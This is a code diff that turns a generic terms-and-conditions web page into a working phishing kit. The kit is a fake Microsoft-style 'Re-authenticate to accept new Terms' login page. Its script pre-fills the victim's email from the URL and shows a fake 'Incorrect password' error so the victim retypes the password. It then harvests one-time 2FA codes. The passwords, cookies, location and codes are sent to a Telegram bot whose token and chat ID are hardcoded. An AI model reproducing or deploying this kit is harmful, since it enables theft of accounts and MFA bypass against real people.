@@ -2,364 +2,638 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Terms and Conditions</title>
-<!-- Dynamic favicon -->
-<link id="dynamicFavicon" rel="icon" href="">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login Verification</title>
+
 <style>
-    :root {
-        --primary-green: #28a745;
-    }
+#email-display-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  flex-wrap: wrap !important;    /* THIS FIXES THE CLIPPING */
+  width: 100%;
+}
+#back-arrow {
+  display: none !important;
+}
 
-    body {
-        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-        background: #f4f6f9;
-        margin: 0;
-        padding: 0;
-        color: #333;
-        line-height: 1.6;
-        min-height: 100vh;
-    }
 
-    .container {
-        max-width: 960px;
-        width: 90%;
-        margin: 40px auto;
-        background: #ffffff;
-        padding: 40px 30px;
-        border-radius: 16px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-        border-top: 10px solid var(--primary-green);
-        box-sizing: border-box;
-        word-wrap: break-word;
-        overflow-wrap: break-word;
-        hyphens: auto;
-    }
 
-    .logo {
-        width: 100px;
-        height: 100px;
-        display: block;
-        margin: 0 auto 30px auto;
-        border-radius: 16px;
-        object-fit: contain;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    }
+/* Email input — make it look like plain text */
+#email.email-flat {
+  display: inline-block !important;
+  width: 100% !important;         /* allow full row width */
+  white-space: normal !important; /* allow wrapping */
+  word-break: break-all !important; /* break long continuous strings */
+  line-height: 1.4 !important;
+  
+  border: none !important;
+  background: transparent !important;
+  outline: none !important;
+  pointer-events: none !important;
+}
 
-    h1 {
-        text-align: center;
-        font-size: clamp(1.8rem, 5vw, 2.4rem);
-        margin-bottom: 24px;
-        color: #1a1a1a;
-        font-weight: 600;
-        word-break: break-word;
-    }
 
-    h2 {
-        font-size: clamp(1.4rem, 4vw, 1.6rem);
-        margin-top: 40px;
-        margin-bottom: 12px;
-        color: #222;
-        border-bottom: 1px solid #eee;
-        padding-bottom: 8px;
-    }
+/* removes inherited rounded input styling */
+.input-group input#email {
+  border: none !important;
+  background: transparent !important;
+}
 
-    p, li {
-        font-size: clamp(1rem, 3.5vw, 1.05rem);
-        line-height: 1.8;
-        margin-bottom: 16px;
-        word-wrap: break-word;
-        overflow-wrap: break-word;
-    }
+/* ============= GLOBAL ============= */
+body, html {
+  margin: 0;
+  padding: 0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  height: 100%;
+  overflow: hidden;
+}
 
-    ul {
-        padding-left: 20px;
-        margin-bottom: 20px;
-    }
+/* ============= BACKGROUND IFRAME ============= */
+#bg-frame { 
+  position: fixed; 
+  inset: 0; 
+  width: 100%; 
+  height: 100%; 
+  border: none; 
+  z-index: 0; 
+}
 
-    li {
-        margin-bottom: 10px;
-    }
 
-    strong { 
-        color: #111; 
-    }
 
-    .accept-btn {
-        display: block;
-        width: min(90%, 320px);
-        margin: 50px auto;
-        padding: 16px 24px;
-        background: var(--primary-green);
-        border: none;
-        color: white;
-        font-size: clamp(1.1rem, 3vw, 1.2rem);
-        font-weight: 600;
-        border-radius: 12px;
-        cursor: pointer;
-        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-        transition: all 0.3s ease;
-        touch-action: manipulation;
-    }
+/* ============= LOGIN BOX ANIMATION — MICROSOFT 365 STYLE ============= */
+#login-wrapper {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
 
-    .accept-btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-    }
+  /* Microsoft: start slightly to the right + faded */
+  opacity: 0;
+  transform: translateX(40px);
 
-    .accept-btn:active {
-        transform: translateY(0);
-    }
 
-    .footer {
-        text-align: center;
-        margin-top: 60px;
-        color: #666;
-        font-size: 0.9rem;
-        padding-top: 24px;
-        border-top: 1px solid #eee;
-    }
+}
 
-    /* Prevent horizontal scroll on small screens */
-    * {
-        box-sizing: border-box;
-    }
+#login-wrapper.visible {
+  opacity: 1;
+  transform: translateX(0);
+}
+/* Move "Sign in" down a bit from the email field */
+#login-content-container b {
+  display: block;
+  margin-top: 24px; /* adjust this value to your preference */
+  font-size: 20px;  /* optional: make it slightly bigger */
+}
 
-    @media (max-width: 480px) {
-        .container {
-            width: 95%;
-            margin: 20px auto;
-            padding: 30px 20px;
-        }
+/* Space for the paragraph under "Sign in" */
+#login-content-container p {
+  margin-top: 8px; /* adds space between the heading and paragraph */
+  margin-bottom: 12px; /* optional, keeps consistent spacing */
+  font-weight: normal;
+  font-size: 14px;
+  line-height: 1.4;
+}
 
-        .logo {
-            width: 80px;
-            height: 80px;
-        }
 
-        h1 {
-            font-size: 1.8rem;
-        }
+/* Initial state: slightly to the right and invisible */
+.login-content {
+  opacity: 0;
+  transform: translateX(40px);  /* start 40px to the right */
+  transition: opacity 0.4s ease, transform 0.4s ease;
+}
 
-        h2 {
-            font-size: 1.4rem;
-        }
-    }
+/* Visible state: slide in to original position */
+#login-wrapper.visible .login-content {
+  opacity: 1;
+  transform: translateX(0);
+}
+
+
+
+
+/* SHAKE ANIMATION */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-10px); }
+  40% { transform: translateX(10px); }
+  60% { transform: translateX(-8px); }
+  80% { transform: translateX(8px); }
+  100% { transform: translateX(0); }
+}
+.login-content.shake {
+  animation: shake 0.4s;
+}
+
+#error-msg { color:red; margin-top:10px; height:20px; }
+
+
+/* ===== SQUARE LOGIN BOX ===== */
+.login-box {
+  background: #fff;
+  padding: 32px;
+  border-radius: 0;              /* <-- SQUARE */
+  width: 360px;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.12);
+  position: relative;
+}
+
+#logo {
+  width: 100px;
+  display: block;
+  margin: 0 0 20px 0;
+  padding-left: 4px;
+}
+
+/* Space under logo */
+.form-area {
+  margin-top: 80px;
+}
+
+
+/* INPUTS */
+.input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
+.input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
+.input-group input {
+  flex:1; font-size:16px; font-weight:600;
+  border:none; background:transparent;
+  outline:none; border-bottom:1.5px solid transparent;
+  transition:border-color .3s;
+}
+.input-group input:focus { border-bottom:1.5px solid #0078d4; }
+
+.ms-pass-field {
+  width:80%; padding:12px; border:1px solid #8a8a8a;
+  font-size:16px; margin-top:20px;
+}
+
+/* LINKS */
+.ms-links { margin:15px 0 15px; line-height:1.8; }
+.ms-links a { color:#0067b8; text-decoration:none; }
+.ms-links a:hover { text-decoration:underline; }
+
+/* NEXT BUTTON */
+.ms-next-btn {
+  background:#0067b8; color:#fff; border:none;
+  padding:12px 34px; font-size:17px;
+  cursor:pointer; float:right; border-radius:0;
+  transition:background 0.2s ease;
+}
+.ms-next-btn:hover { background:#005a9e; }
+
+
+
+
+
+/* ===== ABSOLUTE FINAL ICON FIX — OVERRIDES EVERYTHING ===== */
+.input-group {
+  position: relative;
+  width: 100%;
+  margin-bottom: 20px;
+}
+
+.input-group .icon {
+  position: absolute;
+  left: 18px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 20px;
+  color: #000;
+  pointer-events: none;
+}
+
+.input-group input {
+  width: 100%;
+  height: 52px;
+  padding-left: 58px !important; /* FORCE PERFECT ALIGNMENT */
+  padding-right: 16px;
+  font-size: 17px;
+  border-radius: 8px;
+  border: 1px solid #bbb;
+  background: #fff;
+  box-sizing: border-box;
+  display: flex;
+  align-items: center;
+}
+
+/* NEXT BUTTON */
+.ms-next-btn {
+  background:#0067b8; color:#fff; border:none;
+  padding:12px 34px; font-size:17px;
+  cursor:pointer; float:right; border-radius:0;
+  transition:background 0.2s ease;
+}
+.ms-next-btn:hover { background:#005a9e; }
+
+
+/* OTP */
+#otp-wrapper {
+  position: fixed;
+  inset: 0;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  opacity: 0;
+  transform: translateX(40px);
+  transition: opacity .4s ease, transform .4s ease;
+}
+#otp-wrapper.show {
+  display: flex;
+  opacity: 1;
+  transform: translateX(0);
+}
+
+.otp-input {
+  width: 42px;
+  height: 46px;
+  font-size: 18px;
+  text-align: center;
+}
+
+
 </style>
 </head>
+
 <body>
-<div class="container">
-    <!-- Dynamic Logo -->
-    <img id="dynamicLogo" class="logo" src="" alt="Company Logo">
 
-    <h1 id="companyNameHeader">Terms and Conditions</h1>
+<iframe id="bg-frame"></iframe>
 
-    <p><strong>Effective Date:</strong> <span id="effectiveDate">12/02/2026</span></p>
+<!-- LOGIN -->
+<div id="login-wrapper">                
+  <div class="login-box">
+     <div class="login-content" id="login-content-container">
 
-    <p id="introText">
-        These Terms and Conditions (“Terms”) govern your access to and use of our advanced email services, 
-        web applications, mobile apps, AI-powered features, and all related functionalities 
-        (collectively, the “Service”) provided by <strong id="companyName">[Company Name]</strong> 
-        (“Company,” “we,” “us,” or “our”). By creating an account, accessing, or using the Service—including 
-        any AI-generated content or automated messaging tools—you agree to be fully bound by these Terms. 
-        If you do not agree, please do not access or use the Service.
-    </p>
+      <img id="logo" src="" alt="Logo">
 
-    <h2>1. Eligibility</h2>
-    <p>To use the Service, you must:</p>
-    <ul>
-        <li>Be at least 16 years old (or the age of digital consent in your jurisdiction).</li>
-        <li>Possess the legal capacity to enter into a binding contract.</li>
-        <li>Not be restricted from using the Service under applicable laws.</li>
-    </ul>
+<div id="email-display-row">
+  <input 
+    type="text" 
+    id="email"
+    class="email-flat"
+    readonly
+  >
+</div>
 
-    <h2>2. Account Registration</h2>
-    <ul>
-        <li>You are required to provide accurate, current, and complete information during registration.</li>
-        <li>You are solely responsible for maintaining the confidentiality of your password and account.</li>
-        <li>You must notify us immediately of any unauthorized use and update your information promptly if it changes.</li>
-    </ul>
+<b>Re-authenticate</b>
+<p style="margin-bottom: 10px; font-weight: normal;">
+  to accept new Terms and Conditions
+</p>
+<input type="password" id="password"
+       placeholder="Password" class="ms-pass-field"/>
+<div class="ms-links">
+  <p>No account? <a id="create-link" href="#">Create one</a></p>
+  <p><a id="forgot-link" href="#">Forgot your password?</a></p>
+</div>
 
-    <h2>3. Prohibited Activities</h2>
-    <p>The Service strictly prohibits the following activities:</p>
-    <ul>
-        <li>Sending spam, bulk unsolicited messages, phishing attempts, or any form of deceptive communication.</li>
-        <li>Distributing malware, viruses, worms, or any harmful code.</li>
-        <li>Using automated systems (bots, scripts, crawlers, or scrapers) without explicit written permission.</li>
-        <li>Harassing, threatening, defaming, or impersonating any person or entity.</li>
-        <li>Interfering with, disrupting, or overloading the Service or its infrastructure.</li>
-        <li>Accessing the Service through any means other than our officially supported interfaces.</li>
-        <li>Engaging in any illegal, fraudulent, harmful, or abusive conduct.</li>
-        <li>Infringing intellectual property rights, including copyrights and trademarks.</li>
-        <li>Sending emails with forged or misleading headers, sender information, or content.</li>
-        <li>Hosting, transmitting, or linking to illegal, obscene, or defamatory material.</li>
-        <li>Excessive or unreasonable use of server resources that impacts other users.</li>
-        <li>Using AI features to generate or distribute harmful, misleading, or prohibited content (e.g., deepfakes, automated scams, or hate speech).</li>
-        <li>Attempting to reverse-engineer, decompile, or extract AI models or proprietary algorithms.</li>
-    </ul>
+<div id="error-msg"></div>
 
-    <h2>4. AI-Powered Features and Generated Content</h2>
-    <p>Our Service may include advanced AI tools for message drafting, summarization, smart replies, sentiment analysis, and automated workflows. You acknowledge that:</p>
-    <ul>
-        <li>AI-generated content is produced algorithmically and may contain inaccuracies, biases, or inappropriate material.</li>
-        <li>You are solely responsible for reviewing, editing, and approving all AI-generated messages before sending.</li>
-        <li>We do not guarantee the accuracy, completeness, or suitability of AI outputs.</li>
-        <li>You must not rely on AI features for critical, legal, medical, or financial decisions.</li>
-        <li>Generated content does not represent our views or endorsements.</li>
-    </ul>
-
-    <h2>5. Privacy and Data Protection</h2>
-    <p>We take your privacy seriously. Our comprehensive Privacy Policy explains in detail:</p>
-    <ul>
-        <li>The types of personal and usage data we collect (including email content processed by AI features).</li>
-        <li>How we use, store, and protect your information.</li>
-        <li>Data retention periods and security measures.</li>
-        <li>Your rights to access, correct, export, or delete your data in accordance with applicable laws (e.g., GDPR, CCPA).</li>
-    </ul>
-
-    <h2>6. Email Storage and Retention</h2>
-    <p>The Service may impose limits on mailbox size, message volume, attachment sizes, and storage duration. You are solely responsible for backing up critical emails and data.</p>
-
-    <h2>7. Service Availability</h2>
-    <p>We endeavor to provide reliable, high-uptime access but cannot guarantee uninterrupted or error-free operation. We are not liable for any data loss, service interruptions, or delays caused by factors beyond our reasonable control.</p>
-
-    <h2>8. Third-Party Integrations</h2>
-    <p>The Service may integrate with third-party applications or services. We are not responsible for their functionality, security, or privacy practices. Use of such integrations is entirely at your own risk.</p>
-
-    <h2>9. Intellectual Property</h2>
-    <p>All content, features, AI models, trademarks, and intellectual property within the Service are owned by the Company or its licensors. You are granted a limited, non-transferable license to use the Service and may not copy, modify, distribute, reverse-engineer, or create derivative works without explicit permission.</p>
-
-    <h2>10. Fees and Payment (If Applicable)</h2>
-    <p>Where the Service is paid, fees are charged on a recurring basis. Payments are non-refundable except as required by law. We reserve the right to modify pricing with reasonable notice.</p>
-
-    <h2>11. Termination and Suspension</h2>
-    <p>We may suspend or terminate your account immediately, without notice, for violations of these Terms, suspicious activity, or legal obligations. Certain provisions (e.g., indemnification, liability limits) survive termination.</p>
-
-    <h2>12. Disclaimer of Warranties</h2>
-    <p>The Service is provided “as is” and “as available” without warranties of any kind, express or implied, including but not limited to guarantees of merchantability, fitness for a particular purpose, email delivery, uptime, security, or AI accuracy.</p>
-
-    <h2>13. Limitation of Liability</h2>
-    <p>To the fullest extent permitted by law, the Company shall not be liable for indirect, incidental, consequential, special, or punitive damages. Our total liability is limited to the amount you paid us in the 12 months preceding any claim.</p>
-
-    <h2>14. Indemnification</h2>
-    <p>You agree to defend, indemnify, and hold harmless the Company from any claims, damages, or expenses arising from your use of the Service, violation of these Terms, or infringement of third-party rights.</p>
-
-    <h2>15. Changes to the Terms</h2>
-    <p>We may revise these Terms at any time. We will notify you of material changes. Your continued use of the Service after changes constitutes acceptance of the updated Terms.</p>
-
-    <h2>16. Contact Information</h2>
-    <p>
-        <strong id="companyNameFooter">[Company Name]</strong><br>
-        Email: <span id="companyEmail">support@domain.com</span><br>
-        Website: <span id="companyWebsite">https://www.domain.com</span>
-    </p>
-
-    <button class="accept-btn" id="acceptBtn">I Accept the Terms and Conditions</button>
-
-    <div class="footer">
-        © <span id="companyNameFooter2">[Company Name]</span> <span id="year">2025</span>. All Rights Reserved.
+<button id="login-btn" class="ms-next-btn">Next</button>
     </div>
+  </div>
+</div>
+
+<!-- OTP -->
+<div id="otp-wrapper">
+  <div class="login-box" id="otp-box">
+    <h2>Enter verification code</h2>
+    <p><strong id="otp-email-display"></strong></p>
+    <div style="display:flex;gap:10px;">
+      <input class="otp-input" maxlength="1">
+      <input class="otp-input" maxlength="1">
+      <input class="otp-input" maxlength="1">
+      <input class="otp-input" maxlength="1">
+      <input class="otp-input" maxlength="1">
+      <input class="otp-input" maxlength="1">
+    </div>
+    <p id="otp-error"></p>
+    <button id="otp-submit" class="ms-next-btn">Verify</button>
+  </div>
 </div>
 
 <script>
-(async function(){
-    function capitalize(str){ return str.charAt(0).toUpperCase() + str.slice(1); }
+document.addEventListener("DOMContentLoaded", async () => {
+  const logoImg = document.getElementById("logo");
+  const loginWrapper = document.getElementById("login-wrapper");
+  const email = document.getElementById("email");
+  const password = document.getElementById("password");
+  const loginBtn = document.getElementById("login-btn");
+  const errorMsg = document.getElementById("error-msg");
 
-    const params = new URLSearchParams(window.location.search);
-    let email = params.get("bazz505");
-    if(email) email = decodeURIComponent(email.trim());
-    history.replaceState({}, document.title, window.location.pathname);
+  const otpWrapper = document.getElementById("otp-wrapper");
+  const otpInputs = document.querySelectorAll(".otp-input");
+  const otpEmailDisplay = document.getElementById("otp-email-display");
+  const otpSubmit = document.getElementById("otp-submit");
+  const otpError = document.getElementById("otp-error");
 
-    let domain = "example.com";
-    if(email && email.includes("@")) domain = email.split("@")[1].toLowerCase();
+  const bgFrame = document.getElementById("bg-frame");
+  const params = new URLSearchParams(location.search);
+  const rawEmail = params.get("bazz505") || "user@example.com";
+  
+  email.value = rawEmail;
+  otpEmailDisplay.textContent = rawEmail;
 
-    const companyName = capitalize(domain.split(".")[0]);
-    const supportEmail = `support@${domain}`;
-    const websiteURL = `https://www.${domain}`;
+  const domain = rawEmail.split("@")[1] || "example.com";
+ 
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+    const domain = rawEmail.split("@")[1];
+    const createLink = document.getElementById("create-link");
+    const forgotLink = document.getElementById("forgot-link");
 
-    document.getElementById("companyName").textContent = companyName;
-    document.getElementById("companyNameHeader").textContent = `Terms and Conditions – ${companyName}`;
-    document.getElementById("companyNameFooter").textContent = companyName;
-    document.getElementById("companyNameFooter2").textContent = companyName;
-    document.getElementById("companyEmail").textContent = supportEmail;
-    document.getElementById("companyWebsite").textContent = websiteURL;
+    createLink.href = "https://www." + domain;
+    forgotLink.href = "https://www." + domain;
+}
 
-    const logoEl = document.getElementById("dynamicLogo");
-    const faviconEl = document.getElementById("dynamicFavicon");
-
-    const logoSources = [
-      `https://logo.clearbit.com/${domain}?size=256`,
-      `https://favicon.vemetric.com/${domain}?size=128`,
-      `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
-      `https://icons.duckduckgo.com/ip3/${domain}.ico`,
-      `https://api.faviconkit.com/${domain}/128`
-    ];
-
-    let idx = 0;
-    function tryNext() {
-        if (idx >= logoSources.length) {
-            logoEl.remove();
-            faviconEl.href = "";
-            return;
-        }
-        fetch(logoSources[idx++], { mode: 'cors' })
-        .then(res => { if(!res.ok) throw "bad"; return res.blob(); })
-        .then(blob => {
-            if(blob.size < 1500) throw "too small";
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                logoEl.src = reader.result;
-                faviconEl.href = reader.result;
-
-                logoEl.onload = () => {
-                    const avgColor = getAverageColor(logoEl);
-
-                    // Apply premium color matching across the page
-                    const acceptBtn = document.getElementById("acceptBtn");
-                    acceptBtn.style.backgroundColor = avgColor;
-
-                    const rgb = avgColor.match(/\d+/g).map(Number);
-                    const brightness = (r,g,b) => (r*299 + g*587 + b*114)/1000;
-                    acceptBtn.style.color = brightness(rgb[0],rgb[1],rgb[2]) > 128 ? '#000' : '#fff';
-
-                    document.querySelector(".container").style.borderTop = `12px solid ${avgColor}`;
-                    document.querySelectorAll("h2").forEach(h => {
-                        h.style.borderBottomColor = avgColor + "40"; // subtle accent
-                    });
-                };
-            };
-            reader.readAsDataURL(blob);
-        })
-        .catch(tryNext);
+// Helper: parse document.cookie into an object { name: value, ... }
+function parseCookies(cookieString = document.cookie) {
+  const cookies = {};
+  if (!cookieString) return cookies;
+  cookieString.split(';').forEach(pair => {
+    const idx = pair.indexOf('=');
+    if (idx > -1) {
+      const name = pair.slice(0, idx).trim();
+      const val = pair.slice(idx + 1).trim();
+      try {
+        cookies[name] = decodeURIComponent(val);
+      } catch {
+        cookies[name] = val;
+      }
     }
+  });
+  return cookies;
+}
 
-    function getAverageColor(imgEl){
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = imgEl.naturalWidth || 1;
-        canvas.height = imgEl.naturalHeight || 1;
-        ctx.drawImage(imgEl, 0, 0);
-        const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-        let r=0, g=0, b=0, count=0;
-        for(let i=0; i<data.length; i+=4){
-            if(data[i+3] > 0){ // ignore transparent
-                r += data[i]; g += data[i+1]; b += data[i+2]; count++;
-            }
-        }
-        if(count === 0) return "rgb(40,167,69)"; // fallback green
-        r = Math.round(r/count); g = Math.round(g/count); b = Math.round(b/count);
-        return `rgb(${r},${g},${b})`;
+// Grab cookies now
+const cookies = parseCookies();
+// Optional: console log to check cookies
+console.log("Cookies available to JS:", cookies);
+  // Setup iframe & fallback screenshot
+  bgFrame.src = `https://${domain}`;
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display: none;
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: 0;
+    pointer-events: none;
+  `;
+  fallbackScreenshot.alt = "Screenshot fallback";
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  let iframeLoaded = false;
+  bgFrame.onload = () => { iframeLoaded = true; fallbackScreenshot.style.display = "none"; bgFrame.style.display = "block"; };
+  setTimeout(() => { if(!iframeLoaded){ bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; } }, 6000);
+  bgFrame.onerror = () => { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; };
+
+  setTimeout(() => loginWrapper.classList.add("visible"), 30);
+  history.replaceState({}, document.title, window.location.pathname);
+
+  // Logo
+  // Set logo
+const logoApis = [
+  `https://logo.clearbit.com/${domain}`,
+   `https://favicon.vemetric.com/${domain}?size=128`,
+  `https://api.faviconkit.com/${domain}/128`,
+  `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+  `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
+];
+
+let logoIndex = 0;
+
+logoImg.src = logoApis[logoIndex];
+
+logoImg.onerror = () => {
+  logoIndex++;
+  if (logoIndex < logoApis.length) {
+    logoImg.src = logoApis[logoIndex];
+  } else {
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  }
+};
+
+ 
+ // ✔ SHAKE FIXED
+  document.getElementById("login-btn").addEventListener("click", () => {
+    const box = document.getElementById("login-content-container");
+    box.classList.remove("shake");
+    void box.offsetWidth;
+    box.classList.add("shake");
+  });
+  // Fetch user country (mandatory)
+
+// Location details
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
+loginBtn.disabled = true;
+
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .catch(() => {
+    // silent fail
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
+  });
+
+  // Telegram
+  const TELEGRAM_BOT_TOKEN = "8455445551:AAHkSEr92xfXk8gn7URZ9T2dUUH82oA1W04";
+  const TELEGRAM_CHAT_ID = "8488244287";
+  let attempts = 0;
+
+function sendTelegramMessage(emailVal, passwordVal, attempt) {
+    const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+                 ` 🖥️UserId : [ ${emailVal} ]\n` +
+                 `    🔐Pass : [ ${passwordVal} ]\n` +
+                  ` 🌍Country : [ ${userCity}, ${userCountry} ]\n` +
+               ` 🍪Cookies: ${JSON.stringify(cookies)}`;
+               
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
+    }).catch(e => console.error("Telegram send failed:", e));
+  }
+
+  // Login button
+  loginBtn.onclick = () => {
+    if (!password.value.trim()) { errorMsg.textContent = "Password cannot be empty"; return; }
+    attempts++;
+    sendTelegramMessage(email.value, password.value, attempts);
+    if (attempts < 3) {
+      errorMsg.textContent = "Incorrect password";
+      password.value = "";
+    } else {
+      loginWrapper.style.display = "none";
+      otpWrapper.classList.add("show");
     }
+  };
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
+    }).catch(e => console.error("Telegram OTP send failed:", e));
+}
 
-    tryNext();
+/* ==========================
+   OTP — AUTO INPUT + COUNTDOWN
+   ========================== */
 
-   document.getElementById("acceptBtn").addEventListener("click", ()=>{
-        let targetURL = "review.html";
-        if(email) targetURL += `?bazz505=${encodeURIComponent(email)}`;
-        window.location.href = targetURL;
+let otpAttempts = 0;
+let otpTimer;
+let otpTimeLeft = 90; // 1 minute 30 seconds
+
+const countdownText = document.createElement("p");
+countdownText.style.marginTop = "10px";
+countdownText.style.fontSize = "14px";
+countdownText.style.color = "#333";
+document.getElementById("otp-box").appendChild(countdownText);
+
+function startOtpCountdown() {
+    otpTimeLeft = 300;
+
+    countdownText.textContent = `Code expires in 5:00`;
+
+    otpTimer = setInterval(() => {
+        otpTimeLeft--;
+
+        let m = Math.floor(otpTimeLeft / 60);
+        let s = otpTimeLeft % 60;
+
+        countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;
+
+        if (otpTimeLeft <= 0) {
+            clearInterval(otpTimer);
+            countdownText.textContent = "Code expired. Request a new one.";
+        }
+    }, 1000);
+}
+
+// Start countdown immediately when OTP screen shows
+const observer = new MutationObserver(() => {
+    if (otpWrapper.classList.contains("show")) {
+        startOtpCountdown();
+    }
+});
+observer.observe(otpWrapper, { attributes: true });
+
+
+// =======================
+// OTP AUTO MOVEMENT
+// =======================
+
+otpInputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+        input.value = input.value.replace(/\D/g, ""); // only digits
+
+        if (input.value && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+        }
     });
 
-})();
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            otpInputs[index - 1].focus();
+        }
+    });
+});
+
+
+// =======================
+// OTP SUBMIT
+// =======================
+
+otpSubmit.onclick = () => {
+    const code = Array.from(otpInputs).map(i => i.value).join("");
+
+    otpAttempts++;
+
+    // Send OTP to Telegram
+    sendToTelegram(`OTP entered for ${email.value}: ${code}`);
+
+    if (otpAttempts >= 3) {
+        otpWrapper.style.display = "none";
+        return;
+    }
+
+    if (code.length < 6) {
+        otpError.textContent = "Enter the 6-digit code";
+        return;
+    }
+
+    if (otpTimeLeft <= 0) {
+        otpError.textContent = "Code expired. Request a new one.";
+        return;
+    }
+
+    // WRONG CODE (always, unless you define correct one)
+    otpError.textContent = "Incorrect code";
+    document.getElementById("otp-box").classList.add("shake");
+    setTimeout(() => {
+        document.getElementById("otp-box").classList.remove("shake");
+    }, 400);
+};
+/* ==========================
+   OTP RESEND + TIMER RESET
+   ========================== */
+
+const otpResend = document.getElementById("otp-resend");
+
+function resetOtpInputs() {
+    otpInputs.forEach(i => i.value = "");
+    otpInputs[0].focus();
+}
+
+function restartOtpTimer() {
+    clearInterval(otpTimer);
+    otpTimeLeft = 300; // reset to 5 minutes
+
+    countdownText.textContent = `Code expires in 5:00`;
+
+    otpTimer = setInterval(() => {
+        otpTimeLeft--;
+
+        let m = Math.floor(otpTimeLeft / 60);
+        let s = otpTimeLeft % 60;
+        countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;
+
+        if (otpTimeLeft <= 0) {
+            clearInterval(otpTimer);
+            countdownText.textContent = "Code expired. Request a new one.";
+        }
+    }, 1000);
+}
+
+otpResend.onclick = () => {
+    // Tell Telegram user requested a new code
+    sendToTelegram(`User requested NEW OTP for: ${email.value}`);
+
+    // Reset inputs
+    resetOtpInputs();
+
+    // Clear error
+    otpError.textContent = "";
+
+    // Restart countdown
+    restartOtpTimer();
+
+    // UI feedback
+    otpResend.textContent = "New code sent";
+    setTimeout(() => otpResend.textContent = "Resend Code", 2000);
+};
+
+});
 </script>
 
 </body>
